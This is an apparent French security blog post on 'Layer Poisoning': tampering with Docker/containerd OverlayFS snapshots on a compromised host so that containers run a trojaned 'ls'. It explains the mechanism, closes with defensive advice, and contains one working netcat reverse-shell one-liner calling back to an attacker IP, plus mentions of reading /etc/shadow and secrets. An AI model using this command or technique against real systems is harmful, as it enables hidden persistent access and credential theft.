Layer poisoning, l'art de compromettre Docker par ses fondations

On présente souvent les conteneurs Docker comme des environnements isolés et immuables. Pourtant, il existe une technique d'attaque appelée Layer Poisoning. Elle permet de compromettre un conteneur en modifiant silencieusement ses couches de système de fichiers directement sur l'hôte.

1. Le concept : Empoisonner la source

Le "Layer Poisoning" consiste à injecter du code malveillant dans les snapshots de stockage de Docker (gérés par containerd). Ce n'est pas un bug de Docker en soi, mais une exploitation directe de son architecture. Si un attaquant parvient à obtenir un accès root sur l'hôte, il peut modifier les fichiers "sources" que le conteneur utilise pour démarrer. Résultat ? Une backdoor persistante, invisible pour les outils de scan classiques.

2. Docker et OverlayFS

Pour comprendre l'attaque, il faut comprendre OverlayFS. Docker empile les couches d'images pour former le système de fichiers final du conteneur. Ce mécanisme repose sur trois piliers :

  • Lowerdir : Les couches de l'image de base (ex: Alpine), normalement en lecture seule.
  • Upperdir : La couche d'écriture propre au conteneur (où vont vos modifications).
  • Merged : La vue fusionnée que l'utilisateur voit à l'intérieur du conteneur.

En temps normal, le lowerdir est protégé. Mais sur l'hôte, ces fichiers sont stockés dans /var/lib/containerd/.../snapshots/. En modifiant ces snapshots, on modifie l'ADN même du conteneur.

3. Anatomie d'une attaque (Proof of Concept)

Passons à la pratique. L'objectif ici est de transformer une commande banale (ls) en un vecteur de connexion pour l'attaquant.

Étape 1 : Préparation de l'écouteur

Côté attaquant : On prépare un listener netcat sur le port 4444.

Étape 2 : Identification de la cible sur l'hôte

On lance deux conteneurs Alpine classiques. Pour l'expérience, on suppose qu'on a déjà un accès root sur l'hôte. Notre but est de trouver où ces conteneurs "vivent" physiquement.

Ici, on identifie le point de montage OverlayFS associé au conteneur.

Étape 3 : Injection du poison

Une fois dans le snapshot (ici le n°49), on a accès à l'arborescence complète du conteneur (/bin, /etc, etc.). C'est ici qu'on va agir.

On remplace le binaire ls par un script malveillant. Ce script fait deux choses : 1. Il lance un Reverse Shell en arrière-plan vers l'IP de l'attaquant. 2. Il appelle le vrai binaire ls pour que l'utilisateur ne remarque rien. 

(mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f &) > /dev/null 2>&1

Étape 4 : Le "Pop" du Shell

L'utilisateur exécute la commande ls /etc. L'affichage est normal, l'illusion est parfaite.

Coté attaquant : La connexion arrive. On devient root et on peut lire les secrets (/etc/shadow, variables d'env, etc.).

4. Au final, pourquoi c'est redoutable ?

Ce qui rend le Layer Poisoning particulièrement vicieux, c'est sa discrétion. Si vous lancez un docker diff, Docker ne verra aucune modification parce que la modification a eu lieu dans le Lowerdir (l'image de base) et non dans la couche d'écriture du conteneur. En plus de ça, tout nouveau conteneur créé à partir de cette image locale sera nativement infecté.

5. Conclusion

Cette démonstration prouve que si l'intégrité de l'hôte est compromise, c'est le conteneur qui est en danger. Selon moi, quelques pistes d'amélioration... Tout repose d'abord sur le PoLP afin de verrouiller l'accès aux dossiers critiques de containerd. Ensuite, j'ai vu qu'il existe l'option --read-only qui permet de neutraliser la persistance d'une intrusion. Enfin, plus poussé mais il y a aussi des outils de monitoring d'intégrité (FIM) qui peuvent être utilisés pour détecter en temps réel la moindre modification suspecte au sein de /var/lib/docker.
